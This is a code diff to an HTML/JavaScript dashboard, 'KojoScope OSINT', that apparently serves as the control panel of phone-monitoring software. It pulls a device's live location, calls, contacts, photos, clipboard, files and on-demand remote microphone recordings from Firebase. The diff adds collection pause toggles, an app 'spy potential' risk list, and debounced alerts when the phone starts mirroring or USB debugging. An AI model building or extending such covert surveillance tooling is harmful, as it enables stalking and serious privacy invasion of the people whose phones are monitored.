@@ -4,6 +4,9 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0">
 <title>KojoScope OSINT</title>
+<link rel="manifest" href="manifest.json">
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-messaging-compat.js"></script>
 <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <style>
@@ -281,6 +284,14 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <span class="read-budget" id="readBudget"></span>
 <span class="read-budget" id="queueBadge" style="color:var(--accent);cursor:pointer;margin-left:6px" title="Pending offline queue size">&#x1F4E2; 0</span>
 <div class="global-search"><input type="text" id="globalSearch" placeholder="&#x1F50D; Search all data..." title="Search across all tabs"><div id="globalSearchResults"></div></div>
+<label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none;background:var(--card);border:1px solid var(--danger);border-radius:20px;padding:4px 10px;margin-left:8px">
+<div style="position:relative;width:38px;height:20px">
+<input type="checkbox" id="masterPauseToggle" onchange="toggleSyncPause('all', this.checked)" style="opacity:0;width:0;height:0">
+<span id="masterPauseSlider" style="position:absolute;inset:0;background:var(--success);border-radius:10px;transition:.2s"></span>
+<span id="masterPauseKnob" style="position:absolute;left:2px;top:2px;width:16px;height:16px;background:#fff;border-radius:50%;transition:.2s;box-shadow:0 1px 3px rgba(0,0,0,.3)"></span>
+</div>
+<span id="masterPauseLabel" style="font-size:11px;font-weight:600;color:var(--success)">Master: Collecting</span>
+</label>
 </div>
 <div class="alert-banner" id="alertBanner"></div>
 <div class="sidebar">
@@ -304,6 +315,17 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 </div>
 <div class="content" id="tabContent">
 <div class="active" id="tab-live">
+<div style="display:flex;align-items:center;gap:12px;margin-bottom:10px;padding:10px 12px;background:var(--card);border:1px solid var(--border);border-radius:8px" id="syncToggleWrap_location">
+<label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none">
+<div style="position:relative;width:44px;height:24px">
+<input type="checkbox" id="syncPauseToggle_location" onchange="toggleSyncPause('location', this.checked)" style="opacity:0;width:0;height:0">
+<span id="syncToggleSlider_location" style="position:absolute;inset:0;background:var(--success);border-radius:12px;transition:.2s"></span>
+<span id="syncToggleKnob_location" style="position:absolute;left:2px;top:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:.2s;box-shadow:0 1px 3px rgba(0,0,0,.3)"></span>
+</div>
+<span id="syncToggleLabel_location" style="font-size:13px;font-weight:600;color:var(--success)">Location Sync: Collecting</span>
+</label>
+<span id="syncToggleStatus_location" style="font-size:12px;color:var(--muted);margin-left:auto">—</span>
+</div>
 <div class="grid">
 <div style="grid-column:1 / -1;display:flex;gap:6px;flex-wrap:wrap;font-size:10px">
   <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swAppVer">&#x1F4E6; --</span>
@@ -407,6 +429,17 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 </div>
 </div>
 <div id="tab-recents">
+<div style="display:flex;align-items:center;gap:12px;margin-bottom:10px;padding:10px 12px;background:var(--card);border:1px solid var(--border);border-radius:8px" id="syncToggleWrap_recents">
+<label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none">
+<div style="position:relative;width:44px;height:24px">
+<input type="checkbox" id="syncPauseToggle_recents" onchange="toggleSyncPause('recents', this.checked)" style="opacity:0;width:0;height:0">
+<span id="syncToggleSlider_recents" style="position:absolute;inset:0;background:var(--success);border-radius:12px;transition:.2s"></span>
+<span id="syncToggleKnob_recents" style="position:absolute;left:2px;top:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:.2s;box-shadow:0 1px 3px rgba(0,0,0,.3)"></span>
+</div>
+<span id="syncToggleLabel_recents" style="font-size:13px;font-weight:600;color:var(--success)">Recents Sync: Collecting</span>
+</label>
+<span id="syncToggleStatus_recents" style="font-size:12px;color:var(--muted);margin-left:auto">—</span>
+</div>
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;flex-wrap:wrap;gap:4px">
 <span style="font-size:16px;font-weight:500">&#x23F1; App Snapshots <span id="recentsCount" style="font-weight:400;color:var(--muted);font-size:14px"></span></span>
 <div style="display:flex;align-items:center;gap:6px;flex-wrap:wrap">
@@ -433,6 +466,17 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <div id="recentsSentinel"></div>
 </div>
 <div id="tab-photos">
+<div style="display:flex;align-items:center;gap:12px;margin-bottom:10px;padding:10px 12px;background:var(--card);border:1px solid var(--border);border-radius:8px" id="syncToggleWrap_photos">
+<label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none">
+<div style="position:relative;width:44px;height:24px">
+<input type="checkbox" id="syncPauseToggle_photos" onchange="toggleSyncPause('photos', this.checked)" style="opacity:0;width:0;height:0">
+<span id="syncToggleSlider_photos" style="position:absolute;inset:0;background:var(--success);border-radius:12px;transition:.2s"></span>
+<span id="syncToggleKnob_photos" style="position:absolute;left:2px;top:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:.2s;box-shadow:0 1px 3px rgba(0,0,0,.3)"></span>
+</div>
+<span id="syncToggleLabel_photos" style="font-size:13px;font-weight:600;color:var(--success)">Photos Sync: Collecting</span>
+</label>
+<span id="syncToggleStatus_photos" style="font-size:12px;color:var(--muted);margin-left:auto">—</span>
+</div>
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;flex-wrap:wrap;gap:4px">
 <span style="font-size:16px;font-weight:500">&#x1F4F8; Photos <span id="photoCount" style="font-weight:400;color:var(--muted);font-size:14px"></span></span>
 <input id="photoSearch" type="text" placeholder="Search photos..." style="background:var(--bg);color:var(--text);border:1px solid var(--border);padding:6px 10px;border-radius:6px;font-size:12px;min-width:140px" oninput="renderPhotosFromCache()">
@@ -448,6 +492,17 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <div id="loadMoreContainer"></div>
 </div>
 <div id="tab-videos">
+<div style="display:flex;align-items:center;gap:12px;margin-bottom:10px;padding:10px 12px;background:var(--card);border:1px solid var(--border);border-radius:8px" id="syncToggleWrap_videos">
+<label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none">
+<div style="position:relative;width:44px;height:24px">
+<input type="checkbox" id="syncPauseToggle_videos" onchange="toggleSyncPause('videos', this.checked)" style="opacity:0;width:0;height:0">
+<span id="syncToggleSlider_videos" style="position:absolute;inset:0;background:var(--success);border-radius:12px;transition:.2s"></span>
+<span id="syncToggleKnob_videos" style="position:absolute;left:2px;top:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:.2s;box-shadow:0 1px 3px rgba(0,0,0,.3)"></span>
+</div>
+<span id="syncToggleLabel_videos" style="font-size:13px;font-weight:600;color:var(--success)">Videos Sync: Collecting</span>
+</label>
+<span id="syncToggleStatus_videos" style="font-size:12px;color:var(--muted);margin-left:auto">—</span>
+</div>
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;flex-wrap:wrap;gap:4px">
 <span style="font-size:16px;font-weight:500">&#x1F3AC; Videos <span id="videoCount" style="font-weight:400;color:var(--muted);font-size:14px"></span></span>
 <div style="display:flex;gap:6px">
@@ -504,6 +559,17 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <div id="waWizardCard" style="background:var(--card);border:1px solid var(--border);border-radius:14px;max-width:580px;width:100%;max-height:88vh;overflow:auto;padding:18px;font-size:14px"></div>
 </div>
 <div id="tab-calls">
+<div style="display:flex;align-items:center;gap:12px;margin-bottom:10px;padding:10px 12px;background:var(--card);border:1px solid var(--border);border-radius:8px" id="syncToggleWrap_calls">
+<label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none">
+<div style="position:relative;width:44px;height:24px">
+<input type="checkbox" id="syncPauseToggle_calls" onchange="toggleSyncPause('calls', this.checked)" style="opacity:0;width:0;height:0">
+<span id="syncToggleSlider_calls" style="position:absolute;inset:0;background:var(--success);border-radius:12px;transition:.2s"></span>
+<span id="syncToggleKnob_calls" style="position:absolute;left:2px;top:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:.2s;box-shadow:0 1px 3px rgba(0,0,0,.3)"></span>
+</div>
+<span id="syncToggleLabel_calls" style="font-size:13px;font-weight:600;color:var(--success)">Calls Sync: Collecting</span>
+</label>
+<span id="syncToggleStatus_calls" style="font-size:12px;color:var(--muted);margin-left:auto">—</span>
+</div>
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;flex-wrap:wrap;gap:6px">
 <span style="font-size:16px;font-weight:500">&#x1F4DE; Calls <span id="callsCount" style="font-weight:400;color:var(--muted);font-size:14px"></span></span>
 <div style="display:flex;gap:6px;align-items:center;flex-wrap:wrap">
@@ -541,6 +607,17 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
   <div id="appsSnapDebug" style="display:none"></div>
 </div>
 <div id="tab-contacts">
+<div style="display:flex;align-items:center;gap:12px;margin-bottom:10px;padding:10px 12px;background:var(--card);border:1px solid var(--border);border-radius:8px" id="syncToggleWrap_contacts">
+<label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none">
+<div style="position:relative;width:44px;height:24px">
+<input type="checkbox" id="syncPauseToggle_contacts" onchange="toggleSyncPause('contacts', this.checked)" style="opacity:0;width:0;height:0">
+<span id="syncToggleSlider_contacts" style="position:absolute;inset:0;background:var(--success);border-radius:12px;transition:.2s"></span>
+<span id="syncToggleKnob_contacts" style="position:absolute;left:2px;top:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:.2s;box-shadow:0 1px 3px rgba(0,0,0,.3)"></span>
+</div>
+<span id="syncToggleLabel_contacts" style="font-size:13px;font-weight:600;color:var(--success)">Contacts Sync: Collecting</span>
+</label>
+<span id="syncToggleStatus_contacts" style="font-size:12px;color:var(--muted);margin-left:auto">—</span>
+</div>
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
   <span style="font-size:16px;font-weight:500">&#x1F4CD; Contacts</span>
   <span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" onclick="pollContacts()">&#x1F504; Refresh</span>
@@ -549,6 +626,17 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <div id="contactsList"><div class="label">No contacts synced yet</div></div>
 </div>
 <div id="tab-voice">
+<div style="display:flex;align-items:center;gap:12px;margin-bottom:10px;padding:10px 12px;background:var(--card);border:1px solid var(--border);border-radius:8px" id="syncToggleWrap_voice">
+<label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none">
+<div style="position:relative;width:44px;height:24px">
+<input type="checkbox" id="syncPauseToggle_voice" onchange="toggleSyncPause('voice', this.checked)" style="opacity:0;width:0;height:0">
+<span id="syncToggleSlider_voice" style="position:absolute;inset:0;background:var(--success);border-radius:12px;transition:.2s"></span>
+<span id="syncToggleKnob_voice" style="position:absolute;left:2px;top:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:.2s;box-shadow:0 1px 3px rgba(0,0,0,.3)"></span>
+</div>
+<span id="syncToggleLabel_voice" style="font-size:13px;font-weight:600;color:var(--success)">Voice Sync: Collecting</span>
+</label>
+<span id="syncToggleStatus_voice" style="font-size:12px;color:var(--muted);margin-left:auto">—</span>
+</div>
 <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:8px">
 <span style="font-size:13px;font-weight:500;color:var(--text)">&#x1F3A4; Voice Notes</span>
 <span id="voiceDeviceLabel" class="vmeta" style="background:var(--card);padding:2px 8px;border-radius:10px;border:1px solid var(--border)"></span>
@@ -641,6 +729,17 @@ On-demand mic recordings triggered from the dashboard. Segments are auto-assembl
 <div id="remoteRecordingsList"><div class="label">No remote recordings yet</div></div>
 </div>
 <div id="tab-storage">
+<div style="display:flex;align-items:center;gap:12px;margin-bottom:10px;padding:10px 12px;background:var(--card);border:1px solid var(--border);border-radius:8px" id="syncToggleWrap_all_storage">
+<label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none">
+<div style="position:relative;width:44px;height:24px">
+<input type="checkbox" id="syncPauseToggle_all_storage" onchange="toggleSyncPause('all', this.checked)" style="opacity:0;width:0;height:0">
+<span id="syncToggleSlider_all_storage" style="position:absolute;inset:0;background:var(--success);border-radius:12px;transition:.2s"></span>
+<span id="syncToggleKnob_all_storage" style="position:absolute;left:2px;top:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:.2s;box-shadow:0 1px 3px rgba(0,0,0,.3)"></span>
+</div>
+<span id="syncToggleLabel_all_storage" style="font-size:13px;font-weight:600;color:var(--success)">Master Pause ALL: Collecting</span>
+</label>
+<span id="syncToggleStatus_all_storage" style="font-size:12px;color:var(--muted);margin-left:auto">—</span>
+</div>
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
   <span style="font-size:16px;font-weight:500">&#x1F4E6; Storage & Cleanup</span>
   <span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" onclick="refreshStorage()">&#x1F504; Refresh</span>
@@ -652,6 +751,20 @@ On-demand mic recordings triggered from the dashboard. Segments are auto-assembl
 </div>
 </div>
 <div id="tab-permissions">
+<div id="permCriticalBanner" style="display:none;background:var(--danger);color:#fff;padding:10px 12px;border-radius:8px;margin-bottom:10px;font-size:13px;font-weight:600;align-items:center;gap:8px">⚠️ Critical Spy Potential Detected — Review Permissions</div>
+<div id="permSpyList" style="margin-bottom:12px"></div>
+
+<div style="display:flex;align-items:center;gap:12px;margin-bottom:10px;padding:10px 12px;background:var(--card);border:1px solid var(--border);border-radius:8px" id="syncToggleWrap_perms">
+<label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none">
+<div style="position:relative;width:44px;height:24px">
+<input type="checkbox" id="syncPauseToggle_perms" onchange="toggleSyncPause('perms', this.checked)" style="opacity:0;width:0;height:0">
+<span id="syncToggleSlider_perms" style="position:absolute;inset:0;background:var(--success);border-radius:12px;transition:.2s"></span>
+<span id="syncToggleKnob_perms" style="position:absolute;left:2px;top:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:.2s;box-shadow:0 1px 3px rgba(0,0,0,.3)"></span>
+</div>
+<span id="syncToggleLabel_perms" style="font-size:13px;font-weight:600;color:var(--success)">Perms Sync: Collecting</span>
+</label>
+<span id="syncToggleStatus_perms" style="font-size:12px;color:var(--muted);margin-left:auto">—</span>
+</div>
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
   <span style="font-size:16px;font-weight:500">&#x1F512; App Permissions</span>
   <span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" onclick="pollPermissions()">&#x1F504; Refresh</span>
@@ -664,6 +777,17 @@ On-demand mic recordings triggered from the dashboard. Segments are auto-assembl
 <div id="permList"><div class="label">No permissions data yet</div></div>
 </div>
 <div id="tab-wifi">
+<div style="display:flex;align-items:center;gap:12px;margin-bottom:10px;padding:10px 12px;background:var(--card);border:1px solid var(--border);border-radius:8px" id="syncToggleWrap_wifi">
+<label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none">
+<div style="position:relative;width:44px;height:24px">
+<input type="checkbox" id="syncPauseToggle_wifi" onchange="toggleSyncPause('wifi', this.checked)" style="opacity:0;width:0;height:0">
+<span id="syncToggleSlider_wifi" style="position:absolute;inset:0;background:var(--success);border-radius:12px;transition:.2s"></span>
+<span id="syncToggleKnob_wifi" style="position:absolute;left:2px;top:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:.2s;box-shadow:0 1px 3px rgba(0,0,0,.3)"></span>
+</div>
+<span id="syncToggleLabel_wifi" style="font-size:13px;font-weight:600;color:var(--success)">WiFi Sync: Collecting</span>
+</label>
+<span id="syncToggleStatus_wifi" style="font-size:12px;color:var(--muted);margin-left:auto">—</span>
+</div>
 <div class="wifi-parallel" style="display:grid;grid-template-columns:1fr 1fr;gap:16px;align-items:start">
 <div id="nearbySection" style="margin-bottom:0">
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
@@ -686,6 +810,17 @@ On-demand mic recordings triggered from the dashboard. Segments are auto-assembl
 </div>
 </div>
 <div id="tab-logcat">
+<div style="display:flex;align-items:center;gap:12px;margin-bottom:10px;padding:10px 12px;background:var(--card);border:1px solid var(--border);border-radius:8px" id="syncToggleWrap_files">
+<label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none">
+<div style="position:relative;width:44px;height:24px">
+<input type="checkbox" id="syncPauseToggle_files" onchange="toggleSyncPause('files', this.checked)" style="opacity:0;width:0;height:0">
+<span id="syncToggleSlider_files" style="position:absolute;inset:0;background:var(--success);border-radius:12px;transition:.2s"></span>
+<span id="syncToggleKnob_files" style="position:absolute;left:2px;top:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:.2s;box-shadow:0 1px 3px rgba(0,0,0,.3)"></span>
+</div>
+<span id="syncToggleLabel_files" style="font-size:13px;font-weight:600;color:var(--success)">Files Sync: Collecting</span>
+</label>
+<span id="syncToggleStatus_files" style="font-size:12px;color:var(--muted);margin-left:auto">—</span>
+</div>
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;flex-wrap:wrap;gap:4px">
 <span style="font-size:16px;font-weight:500">&#x1F4DD; Logcat</span>
 <div style="display:flex;gap:6px">
@@ -732,6 +867,17 @@ On-demand mic recordings triggered from the dashboard. Segments are auto-assembl
 <div id="logcatContent" style="font-family:monospace;font-size:12px;line-height:1.4;max-height:60vh;overflow-y:auto;background:#0d1117;padding:8px;border-radius:6px;border:1px solid var(--border)"><div class="label" style="color:var(--muted)">Click Refresh to load logcat</div></div>
 </div>
 <div id="tab-health">
+<div style="display:flex;align-items:center;gap:12px;margin-bottom:10px;padding:10px 12px;background:var(--card);border:1px solid var(--border);border-radius:8px" id="syncToggleWrap_health">
+<label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none">
+<div style="position:relative;width:44px;height:24px">
+<input type="checkbox" id="syncPauseToggle_health" onchange="toggleSyncPause('health', this.checked)" style="opacity:0;width:0;height:0">
+<span id="syncToggleSlider_health" style="position:absolute;inset:0;background:var(--success);border-radius:12px;transition:.2s"></span>
+<span id="syncToggleKnob_health" style="position:absolute;left:2px;top:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:.2s;box-shadow:0 1px 3px rgba(0,0,0,.3)"></span>
+</div>
+<span id="syncToggleLabel_health" style="font-size:13px;font-weight:600;color:var(--success)">Health Sync: Collecting</span>
+</label>
+<span id="syncToggleStatus_health" style="font-size:12px;color:var(--muted);margin-left:auto">—</span>
+</div>
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;flex-wrap:wrap;gap:4px">
 <span style="font-size:16px;font-weight:500">&#x1F4AA; Health</span>
 <div style="display:flex;gap:6px">
@@ -1332,7 +1478,7 @@ let playbackLoop = false;
 
 // --- Poll Timers ---
 let pollTimers = [];
-const BASE_INTERVALS = { loc: 3000, hist: 600000, meta: 30000, apps: 300000, voice: 300000, fcm: 60000, contacts: 3600000, perms: 3600000, logcat: 300000, remote: 30000, photos: 600000, videos: 60000, health: 3600000, mirror: 10000, spy: 10000, clipboard: 30000, files: 60000, appVer: 30000 };
+const BASE_INTERVALS = { loc: 3000, hist: 600000, meta: 30000, apps: 300000, voice: 300000, fcm: 60000, contacts: 3600000, perms: 900000, logcat: 300000, remote: 30000, photos: 600000, videos: 60000, health: 3600000, mirror: 10000, spy: 10000, clipboard: 30000, files: 60000, appVer: 30000 };
 let intervals = { ...BASE_INTERVALS };
 
 // --- Init Map ---
@@ -2746,6 +2892,7 @@ function startPolling() {
   schedulePoll('photos', intervals.photos, pollPhotos);
   schedulePoll('videos', 60000, pollVideos);
   schedulePoll('clipboard', intervals.clipboard, pollClipboard);
+  schedulePoll('syncToggles', 30000, pollSyncToggles);
   schedulePoll('files', 14 * 60 * 1000, pollFileInventory);
 }
 
@@ -2758,7 +2905,7 @@ function schedulePoll(name, interval, fn) {
 }
 
 async function pollAll() {
-  const fns = [pollLocation(), pollMeta(), pollAppSnapshots(), pollHistory(), pollVoiceNotes(), pollRemoteRecordings(), pollContacts(), pollFcmToken(), pollQueueSize(), pollPermissions(), pollWifiScans(), pollNearbyScans(), pollLogcat(), pollHealth(), pollVideos(), pollPhotos(), pollMirroring(), pollSpy(), pollAppVer(), pollClipboard(), pollFileInventory()];
+  const fns = [pollLocation(), pollMeta(), pollAppSnapshots(), pollHistory(), pollVoiceNotes(), pollRemoteRecordings(), pollContacts(), pollFcmToken(), pollQueueSize(), pollPermissions(), pollWifiScans(), pollNearbyScans(), pollLogcat(), pollHealth(), pollVideos(), pollPhotos(), pollMirroring(), pollSpy(), pollAppVer(), pollClipboard(), pollFileInventory(), pollSyncToggles()];
   for (const fn of fns) { try { await fn; } catch {} }
 }
 
@@ -3029,6 +3176,7 @@ async function pollMeta() {
 
 // --- Screen mirroring / Link to Windows / USB-debug live status ---
 let mirrorPrevActive = false;
+let mirrorConfirmCount = 0;
 let usbPrevOn = false;
 
 function isMirrorType(t) { return t.includes('mirror') || t.includes('usb_debug') || t.includes('adb_wifi'); }
@@ -3079,6 +3227,7 @@ async function pollMirroring() {
       detailEl.style.color = (meta && meta.usbDebugActive) ? 'var(--danger)' : 'var(--muted)';
     }
     if (!knownIdle) mirrorPrevActive = false;
+    mirrorConfirmCount = 0;
     return;
   }
   const active = !!m.active;
@@ -3105,12 +3254,21 @@ async function pollMirroring() {
     }
     detail = 'Active since ' + (since || '?') + (sources.length ? ' \u00B7 ' + sources.join(', ') : '');
   }
-  if (active && !mirrorPrevActive) {
+  // Option B: 2-check confirm (20s) — only alert after 2 consecutive active polls, first poll just turns chip red
+  if (active) {
+    mirrorConfirmCount++;
+  } else {
+    mirrorConfirmCount = 0;
+    mirrorPrevActive = false;
+  }
+  if (active && mirrorConfirmCount >= 2 && !mirrorPrevActive) {
     const devLabel = devices[selectedDevice] && devices[selectedDevice].label ? devices[selectedDevice].label : selectedDevice;
     const who = link && link.pcName ? ' (' + link.pcName + ')' : '';
     showAlert('\u26A0 Mirroring / Link to Windows detected on ' + devLabel + who, 'error');
+    mirrorPrevActive = true;
+  } else if (!active) {
+    mirrorPrevActive = false;
   }
-  mirrorPrevActive = active;
   chip.textContent = label;
   chip.style.borderColor = active ? 'var(--danger)' : 'var(--success)';
   chip.style.color = active ? 'var(--danger)' : 'var(--success)';
@@ -7425,9 +7583,13 @@ function renderPermRecent() {
   let h = '<div style="font-size:13px;color:var(--info);font-weight:600;padding:4px 0">\u{1F550} Recently installed</div>';
   h += '<div class="card" style="padding:6px 10px;margin-bottom:4px">';
   for (const app of rec) {
+    const src = app.installSource || '';
+    const isPlay = /vending|play|com\.android\.vending/i.test(src);
+    const badge = src ? '<span class="chip" style="font-size:9px;padding:1px 6px;margin-left:6px;'+(isPlay?'background:var(--success);color:#000':'background:var(--danger);color:#fff')+'">'+(isPlay?'Play Store':'Sideload')+'</span>' : '';
+    const srcTitle = src ? ' title="'+src.replace(/"/g,'&quot;')+'"' : '';
     h += '<div style="display:flex;justify-content:space-between;align-items:center;padding:2px 0;font-size:12px">' +
-      '<span style="font-weight:500;color:var(--text)">\u2B50 ' + app.appName + '</span>' +
-      '<span style="color:var(--info);white-space:nowrap">installed ' + pktShort(app.firstInstallTime) + '</span></div>';
+      '<span style="font-weight:500;color:var(--text)">\u2B50 ' + app.appName + badge + '</span>' +
+      '<span style="color:var(--info);white-space:nowrap"'+srcTitle+'>installed ' + pktShort(app.firstInstallTime) + '</span></div>';
   }
   h += '</div>';
   return h;
@@ -7496,10 +7658,78 @@ function renderPermDeniedRanking() {
   return h;
 }
 
+
+function riskColor(level){
+  const l = (level||'').toLowerCase();
+  if(l==='critical') return 'var(--danger)';
+  if(l==='high') return '#ff8c42';
+  if(l==='medium') return 'var(--accent)';
+  return 'var(--success)';
+}
+function riskChip(level){
+  const col = riskColor(level);
+  const lbl = level ? level : 'Low';
+  return '<span class="chip" style="font-size:10px;padding:2px 6px;background:'+col+';color:'+(col==='var(--accent)'?'#000':'#fff')+';border-color:'+col+'">'+lbl+'</span>';
+}
+function renderPermSpyList(){
+  const el = document.getElementById('permSpyList');
+  if(!el) return '';
+  if(!window.permCache || !window.permCache.length){ el.innerHTML=''; return ''; }
+  let list = window.permCache.filter(a => (a.riskLevel||'').toLowerCase()==='critical');
+  if(!list.length){ el.innerHTML=''; return ''; }
+  list = list.sort((a,b)=> (b.riskScore||0)-(a.riskScore||0));
+  let maxScore = Math.max(...list.map(a=>a.riskScore||0), 1);
+  let h = '<div style="font-size:13px;color:var(--danger);font-weight:600;padding:6px 0 4px">\u2620 Spy Potential — Critical only</div>';
+  h += '<div style="display:flex;flex-direction:column;gap:6px">';
+  for(const app of list){
+    const score = app.riskScore||0;
+    const pct = Math.round((score / maxScore)*100);
+    const col = riskColor(app.riskLevel);
+    const reasons = Array.isArray(app.riskReasons) ? app.riskReasons.join(', ') : (app.riskReasons||'');
+    const recently = app.firstInstallTime && (Date.now() - app.firstInstallTime) < 7*86400000;
+    const isPlay = /vending|play/i.test(app.installSource||'');
+    const srcBadge = app.installSource ? '<span class="chip" style="font-size:9px;padding:1px 6px;'+(isPlay?'background:var(--success);color:#000':'background:var(--danger);color:#fff')+'">'+(isPlay?'Play Store':'Sideload')+'</span>' : '';
+    const sysPill = '<span class="chip" style="font-size:9px;padding:1px 6px;background:var(--card);color:var(--muted);border-color:var(--border)">'+(app.system?'System':'User')+'</span>';
+    const recentStyle = recently ? 'border-left-color:var(--accent);box-shadow:0 0 6px rgba(255,202,40,.25)' : 'border-left-color:'+col;
+    h += '<div class="card" style="padding:8px 10px;margin-bottom:0;'+recentStyle+'">'
+      + '<div style="display:flex;justify-content:space-between;align-items:center;gap:6px;flex-wrap:wrap"><span style="font-weight:600;color:var(--text)">'+app.appName+'</span><span style="display:flex;gap:4px;align-items:center">'+riskChip(app.riskLevel)+sysPill+srcBadge+(recently?'<span class="chip" style="font-size:9px;background:var(--accent);color:#000">NEW</span>':'')+'</span></div>'
+      + '<div style="font-size:10px;color:var(--muted)">'+app.packageName+'</div>'
+      + '<div style="margin:6px 0;height:6px;background:var(--border);border-radius:3px;overflow:hidden"><div style="height:100%;width:'+pct+'%;background:'+col+';border-radius:3px"></div></div>'
+      + '<div style="display:flex;justify-content:space-between;font-size:11px;color:var(--muted)"><span>risk '+score+'</span><span>'+pct+'%</span></div>'
+      + (reasons?'<div style="font-size:11px;color:var(--muted);margin-top:4px">Reasons: '+reasons.replace(/</g,'&lt;')+'</div>':'')
+      + (recently?'<div style="font-size:10px;color:var(--accent);margin-top:2px">\u26A0 Recently installed (7d)</div>':'')
+      + '</div>';
+  }
+  h += '</div>';
+  el.innerHTML = h;
+  return h;
+}
+
 function renderPermissions() {
   const list = document.getElementById('permList');
   const syncInfo = document.getElementById('permSyncInfo');
   renderPermSubTabs();
+  // critical banner: check permissions_risk or spywatch warning
+  try{
+    const banner = document.getElementById('permCriticalBanner');
+    if(banner){
+      let show=false;
+      const rd = window.permRiskRaw;
+      const sd = window.permSpyWarning;
+      if(rd && (rd.riskLevel==='Critical' || rd.level==='Critical' || rd.warning==='Critical' || (rd.risk_level==='Critical')) ) show=true;
+      if(sd && (sd.warning==='Critical' || sd.riskLevel==='Critical' || (sd.risks && sd.risks.length) || sd.last_event_type==='risk_flag')){
+        // also check if any app critical
+        if(window.permCache && window.permCache.some(a=> (a.riskLevel||'').toLowerCase()==='critical')) show=true;
+        // direct warning level
+        if(sd.warning && String(sd.warning).toLowerCase()==='critical') show=true;
+        if(sd.riskLevel && String(sd.riskLevel).toLowerCase()==='critical') show=true;
+      }
+      if(window.permCache && window.permCache.some(a=> (a.riskLevel||'').toLowerCase()==='critical')) show=true;
+      banner.style.display = show ? 'flex' : 'none';
+    }
+  }catch{}
+  // render spy list if available
+  try{ renderPermSpyList(); }catch(e){}
   if (!window.permCache || !window.permCache.length) {
     list.innerHTML = '<div class="label">No permissions data yet</div>';
     const chipsEl = document.getElementById('permChips'); if (chipsEl) chipsEl.innerHTML = '';
@@ -7603,19 +7833,32 @@ function renderPermissions() {
 
 async function pollPermissions() {
   if (!selectedDevice) return;
-  const data = await fetchRTDB(`devices/${selectedDevice}/permissions`);
+  const [data, riskData, spyData] = await Promise.all([
+    fetchRTDB(`devices/${selectedDevice}/permissions`),
+    fetchRTDB(`devices/${selectedDevice}/permissions_risk`),
+    fetchRTDB(`devices/${selectedDevice}/spywatch`)
+  ]);
+  // store warning check for banner
+  window.permRiskRaw = riskData;
+  window.permSpyWarning = spyData;
   if (!data || typeof data !== 'object') {
     window.permCache = null;
     window.permLastSync = 0;
-    document.getElementById('permList').innerHTML = '<div class="label">No permissions data yet</div>';
+    const pl = document.getElementById('permList'); if(pl) pl.innerHTML = '<div class="label">No permissions data yet</div>';
+    // still render banner if risk exists
+    renderPermissions();
     return;
   }
   window.permCache = Object.values(data).map(v => ({
     appName: v.appName || v.packageName || '?',
     packageName: v.packageName || '',
-    firstInstallTime: v.firstInstallTime || 0,
-    lastUpdateTime: v.lastUpdateTime || 0,
+    firstInstallTime: v.firstInstallTime || v.first_install_time || 0,
+    lastUpdateTime: v.lastUpdateTime || v.last_update_time || 0,
     system: v.system === true,
+    installSource: v.installSource || v.install_source || v.installer || v.source || '',
+    riskScore: v.riskScore != null ? parseFloat(v.riskScore) : (v.risk_score != null ? parseFloat(v.risk_score) : 0),
+    riskLevel: v.riskLevel || v.risk_level || v.risk || '',
+    riskReasons: v.riskReasons || v.reasons || v.risk_reasons || [],
